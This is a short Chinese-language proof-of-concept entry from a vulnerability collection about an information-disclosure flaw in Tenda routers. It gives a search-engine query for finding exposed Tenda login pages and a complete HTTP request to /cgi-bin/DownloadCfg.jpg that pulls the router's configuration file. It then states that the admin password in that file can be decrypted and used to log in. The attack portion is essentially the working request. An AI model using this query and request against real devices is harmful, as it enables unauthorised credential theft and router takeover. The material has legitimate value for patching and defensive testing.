---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# Tenda 路由器 DownloadCfg 信息泄露漏洞

# 一、漏洞描述
Tenda 路由器是深圳市吉祥腾达科技有限公司的一款智能无限路由器。Tenda 路由器存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息网访问该系统。

# 二、影响版本
+ Tenda 路由器

# 三、资产测绘
+ hunter`web.title="Tenda | LOGIN"`
+ 特征


# 四、漏洞复现
```java
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: lang=cn,en
Upgrade-Insecure-Requests: 1
```


从配置文件中可找到系统账号密码


解密后成功登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gk3rgwxmuynm2p33>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
